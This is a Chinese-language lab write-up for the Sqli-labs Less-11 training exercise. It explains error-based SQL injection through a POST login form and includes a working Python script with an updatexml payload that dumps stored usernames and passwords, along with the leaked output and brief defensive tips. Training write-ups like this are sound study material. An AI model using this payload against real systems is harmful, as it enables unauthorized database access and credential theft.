## 题目: Sqli-labs Less-11

## 题目描述
本关是一个登录框（Username / Password），页面提示为 `Error Based - String`。与之前的 GET 请求不同，本关使用 POST 表单提交数据。

## 解题思路
由于是 POST 请求，无法直接在 URL 中拼接 Payload，需要使用脚本或抓包工具修改表单数据。
本关的核心是**基于报错的 POST 注入**。利用 `updatexml` 函数制造 XPath 语法错误，将查询到的账号密码带出。

## 解题步骤
**1. 探测注入点与闭合方式**
使用 Python 的 `requests` 库向登录接口发送 POST 数据。尝试在 `uname` 字段输入 `admin'`，页面报错。说明单引号闭合有效。

**2. 构造报错注入 Payload（⚠️ 踩坑记录）**
* **踩坑**：一开始使用 `--+` 作为注释符，拼接后导致后端 `passwd` 字段的 `LIMIT 0,1` 报错（`near '1' LIMIT 0,1`）。
* **破局**：改用 `#` 作为注释符，完美注释掉后面的所有查询条件。

**3. 编写 Python 脚本获取数据**

**实战 Payload 核心代码**：

```python
import requests

url = "http://127.0.0.1/sqli-labs/Less-11/"

# 核心修改：末尾用 # 注释掉后面的密码检查
payload = "admin' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) #"

data = {
    'uname': payload,
    'passwd': '1', 
    'submit': 'Submit'
}

print("正在执行报错注入...")
r = requests.post(url, data=data)

# 逐行查找包含 XPATH 报错信息的行
print("\n============== 寻找报错信息 ==============")
for line in r.text.split('\n'):
    if "XPATH" in line or "error" in line.lower():
        print(line.strip())
```

**4. 运行结果**
成功爆出数据库中的账号密码：
```text
XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'
```
## 知识点总结
* POST 注入：注入点在 POST 请求体（Body）中，必须通过抓包或脚本发送数据。
* 报错注入的长度限制：updatexml 每次只能回显 32 个字符，数据过长会被截断（可以使用 substr 分段获取）。
* 注释符的选择：在 POST 注入中，# 比 --+ 更稳定，能有效避开 URL 编码带来的干扰。
* 防御策略：使用 PDO 预编译彻底隔绝注入；关闭生产环境的详细报错回显
